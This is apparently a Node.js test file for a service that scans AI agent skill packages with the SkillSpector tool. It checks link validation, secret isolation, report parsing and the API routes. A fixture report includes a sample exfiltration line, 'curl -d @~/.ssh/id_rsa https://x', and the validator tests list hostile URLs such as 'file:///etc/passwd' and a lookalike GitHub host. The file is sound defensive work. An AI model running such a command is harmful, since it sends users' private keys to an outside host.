'use strict';

// node --test server/services/skillScan/skillScan.test.js
// Skill Scanner: link checks, the child process's environment (no Vault secrets), arguments (static = --no-llm), report parsing for
// one skill and for --recursive, failure handling, and the routes (upload rules, deep scans through the AI limiter). SkillSpector is
// never run: the process runner is a stand-in that writes the JSON SkillSpector would.

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');
const express = require('express');
const runner = require('./runner');

const SINGLE = {
  skill: { name: 'pdf-helper', source: '/tmp/x' },
  risk_assessment: { score: 62, severity: 'HIGH', recommendation: 'DO_NOT_INSTALL', max_issue_severity: 'CRITICAL' },
  components: [{ path: 'SKILL.md' }, { path: 'run.sh' }],
  issues: [
    { id: 'E1', category: 'data_exfiltration', pattern: 'Sends files to a remote host', severity: 'CRITICAL', confidence: 0.9,
      location: { file: 'run.sh', start_line: 4, end_line: 4 }, explanation: 'Posts ~/.ssh to a URL.', remediation: 'Remove the upload.', code_snippet: 'curl -d @~/.ssh/id_rsa https://x', occurrences: [{}, {}] },
    { id: 'P2', category: 'prompt_injection', severity: 'medium', location: { file: 'SKILL.md', start_line: 9 } },
  ],
  suppressed_count: 1,
  metadata: { skillspector_version: '2.12.0', llm_requested: false },
  execution_successful: true,
  analysis_completeness: { is_complete: true, coverage_percent: 100, limitations: [] },
};

test('parseGithubUrl() takes public github.com repo and folder links only', () => {
  assert.equal(runner.parseGithubUrl('https://github.com/agiprolabs/claude-trading-skills'), 'https://github.com/agiprolabs/claude-trading-skills');
  assert.equal(runner.parseGithubUrl(' https://github.com/NVIDIA/SkillSpector.git/ '), 'https://github.com/NVIDIA/SkillSpector');
  assert.equal(runner.parseGithubUrl('https://github.com/o/r/tree/main/skills/pdf'), 'https://github.com/o/r/tree/main/skills/pdf');
  for (const bad of ['http://github.com/o/r', 'https://gitlab.com/o/r', 'https://github.com/o', 'https://github.com/o/r/tree/main/../../etc',
    'https://github.com.evil.com/o/r', 'git@github.com:o/r.git', 'file:///etc/passwd', 'https://github.com/o/r?x=1', '']) {
    assert.equal(runner.parseGithubUrl(bad), null, bad);
  }
});

test('scanEnv() gives SkillSpector no Vault secrets; only a deep scan gets the Anthropic key', () => {
  const saved = { ...process.env };
  process.env.DATABASE_URL = 'postgres://secret'; process.env.GOOGLE_CLIENT_SECRET = 'g-secret'; process.env.OPENAI_API_KEY = 'o-secret';
  try {
    const st = runner.scanEnv({ home: '/tmp/h' });
    const text = JSON.stringify(st);
    assert.ok(!/secret/.test(text), 'no secret values');
    assert.equal(st.HOME, '/tmp/h');
    assert.equal(st.ANTHROPIC_API_KEY, undefined);
    assert.equal(st.SKILLSPECTOR_PROVIDER, undefined);
    const dp = runner.scanEnv({ home: '/tmp/h', deep: true, anthropicKey: 'sk-ant-x', model: 'claude-sonnet-5-5' });
    assert.equal(dp.ANTHROPIC_API_KEY, 'sk-ant-x');
    assert.equal(dp.SKILLSPECTOR_PROVIDER, 'anthropic');
    assert.equal(dp.SKILLSPECTOR_MODEL, 'claude-sonnet-5-5');
    assert.ok(!/postgres|g-secret|o-secret/.test(JSON.stringify(dp)));
  } finally { process.env = saved; }
});

test('buildArgs(): a static scan always passes --no-llm (model analysis is on by default); --recursive caps at 32 skills', () => {
  assert.deepEqual(runner.buildArgs({ target: 'T', outFile: 'O' }), ['scan', 'T', '-f', 'json', '-o', 'O', '--no-llm']);
  assert.deepEqual(runner.buildArgs({ target: 'T', outFile: 'O', deep: true, recursive: true }), ['scan', 'T', '-f', 'json', '-o', 'O', '--recursive', '--max-skills', '32']);
});

test('normalizeReport(): one skill — verdict, score, counts, findings with file and line', () => {
  const r = runner.normalizeReport(SINGLE);
  assert.equal(r.multi, false);
  assert.equal(r.score, 62);
  assert.equal(r.recommendation, 'DO_NOT_INSTALL');
  assert.equal(r.issueCount, 2);
  assert.deepEqual(r.counts, { CRITICAL: 1, HIGH: 0, MEDIUM: 1, LOW: 0 });
  const [i] = r.skills[0].issues;
  assert.equal(i.file, 'run.sh');
  assert.equal(i.line, 4);
  assert.equal(i.occurrences, 2);
  assert.equal(r.skills[0].issues[1].severity, 'MEDIUM', 'severity upper-cased');
  assert.equal(r.skills[0].fileCount, 2);
  assert.equal(r.version, '2.12.0');
});

test('normalizeReport(): --recursive — one section per skill, a failed skill keeps its error, overall verdict from the run', () => {
  const r = runner.normalizeReport({
    multi_skill: true, skill_count: 3, max_risk_score: 62, risk_severity: 'HIGH', risk_recommendation: 'DO_NOT_INSTALL',
    execution_successful: false, analysis_completeness: { is_complete: false },
    skills: [{ ...SINGLE, name: 'pdf-helper', path: 'skills/pdf' }, { ...SINGLE, name: 'clean', issues: [], risk_assessment: { score: 0, severity: 'LOW', recommendation: 'SAFE' } }, { name: 'broken', error: 'bad zip' }],
  });
  assert.equal(r.multi, true);
  assert.equal(r.skillCount, 3);
  assert.equal(r.score, 62);
  assert.equal(r.complete, false);
  assert.equal(r.issueCount, 2);
  assert.deepEqual(r.skills.map((s) => s.recommendation || s.error), ['DO_NOT_INSTALL', 'SAFE', 'bad zip']);
});

function fakeRun(writeJson, extra = {}) {
  const calls = [];
  return {
    calls,
    run: async (bin, args, opts) => {
      calls.push({ bin, args, opts });
      const out = args[args.indexOf('-o') + 1];
      if (writeJson) fs.writeFileSync(out, JSON.stringify(writeJson));
      return { code: 1, stdout: '', stderr: '', timedOut: false, ...extra };
    },
  };
}

test('runScan(): a GitHub link is passed through; exit 1 (risk found) is a normal result; the temporary folder is removed', async () => {
  const f = fakeRun(SINGLE);
  const out = await runner.runScan({ url: 'https://github.com/o/r' }, { run: f.run });
  assert.equal(out.exitCode, 1);
  assert.equal(out.report.score, 62);
  const { args, opts } = f.calls[0];
  assert.equal(args[1], 'https://github.com/o/r');
  assert.ok(args.includes('--no-llm'));
  assert.ok(!fs.existsSync(opts.cwd), 'temp folder deleted');
});

test('runScan(): a zip is written into the temporary folder and scanned from there', async () => {
  const f = fakeRun(SINGLE);
  let seen = null;
  const run = async (bin, args, opts) => { seen = fs.readFileSync(args[1], 'utf8'); return f.run(bin, args, opts); };
  await runner.runScan({ zipBuffer: Buffer.from('PK-fake') }, { run });
  assert.equal(seen, 'PK-fake');
  assert.match(f.calls[0].args[1], /skill\.zip$/);
});

test('runScan(): refuses bad links and empty input; reports SkillSpector errors, a missing install and timeouts plainly', async () => {
  await assert.rejects(runner.runScan({ url: 'https://evil.com/x' }, { run: async () => ({}) }), (e) => e.status === 400);
  await assert.rejects(runner.runScan({}, { run: async () => ({}) }), (e) => e.status === 400);
  await assert.rejects(runner.runScan({ url: 'https://github.com/o/r' }, fakeRun(null, { code: 2, stderr: 'progress\nValueError: no skills found' })),
    /could not scan that: .*no skills found/);
  await assert.rejects(runner.runScan({ url: 'https://github.com/o/r' }, fakeRun(null, { code: -1, stderr: 'spawn ENOENT' })), /not installed/);
  await assert.rejects(runner.runScan({ url: 'https://github.com/o/r' }, fakeRun(null, { timedOut: true })), /longer than 6 minutes/);
});

test('isInstalled(): true only when `skillspector --help` succeeds', async () => {
  assert.equal(await runner.isInstalled({ run: async () => ({ code: 0 }) }), true);
  assert.equal(await runner.isInstalled({ run: async () => ({ code: -1 }) }), false);
});

// ── routes, with a stand-in service ────────────────────────────────────────────────────
async function withServer(service, fn, limiterHits) {
  const { createSkillScanRouter } = require('../../routes/skillScan');
  const app = express();
  app.use(express.json());
  app.use((req, _res, next) => { req.user = { id: 1, isAdmin: true }; next(); });
  app.use('/api/skill-scan', createSkillScanRouter({ service, limiter: (req, res, next) => { limiterHits.n += 1; next(); } }));
  const server = app.listen(0);
  try { await fn(`http://127.0.0.1:${server.address().port}/api/skill-scan`); } finally { server.close(); }
}

test('routes: link or zip (not both), .zip only, deep scans go through the AI limiter, ids checked', async () => {
  const started = [];
  const service = {
    start: async (userId, input) => { started.push({ userId, ...input, zipBuffer: input.zipBuffer ? input.zipBuffer.length : null }); return { jobId: 'j1', scanId: 5 }; },
    get: async () => null, list: async () => [], config: async () => ({ installed: true }), remove: async () => null, getJob: () => null,
  };
  const hits = { n: 0 };
  await withServer(service, async (base) => {
    const form = (fields, file) => { const f = new FormData(); for (const [k, v] of Object.entries(fields)) f.append(k, v); if (file) f.append('file', new Blob([file.body]), file.name); return f; };
    let r = await fetch(`${base}/scans`, { method: 'POST', body: form({ url: 'https://github.com/o/r', deep: 'false' }) });
    assert.equal(r.status, 202);
    assert.equal(hits.n, 0, 'a static scan does not use the AI limiter');
    r = await fetch(`${base}/scans`, { method: 'POST', body: form({ deep: 'true', recursive: 'true' }, { name: 'skill.zip', body: 'PKxx' }) });
    assert.equal(r.status, 202);
    assert.equal(hits.n, 1, 'a deep scan does');
    assert.deepEqual(started.map((s) => [s.url, s.zipBuffer, s.fileName, s.deep, s.recursive]), [['https://github.com/o/r', null, null, false, false], [null, 4, 'skill.zip', true, true]]);
    r = await fetch(`${base}/scans`, { method: 'POST', body: form({}, { name: 'evil.exe', body: 'MZ' }) });
    assert.equal(r.status, 400);
    r = await fetch(`${base}/scans`, { method: 'POST', body: form({ url: 'https://github.com/o/r' }, { name: 'a.zip', body: 'PK' }) });
    assert.equal(r.status, 400, 'not both');
    assert.equal((await fetch(`${base}/scans/abc`)).status, 404);
    assert.equal((await fetch(`${base}/scans/9`)).status, 404);
    assert.equal((await fetch(`${base}/scans/9`, { method: 'DELETE' })).status, 404);
    assert.equal((await fetch(`${base}/jobs/nope`)).status, 404);
  }, hits);
});

test('the base image installs SkillSpector pinned to a commit, with git, in its own layer', () => {
  const docker = fs.readFileSync(path.join(__dirname, '../../../Dockerfile.base'), 'utf8');
  assert.match(docker, /ARG SKILLSPECTOR_REF=[0-9a-f]{40}/);
  assert.match(docker, /uv tool install --python 3\.13 "skillspector @ git\+https:\/\/github\.com\/NVIDIA\/skillspector\.git@\$\{SKILLSPECTOR_REF\}"/);
  assert.match(docker, /install -y --no-install-recommends git /);
});
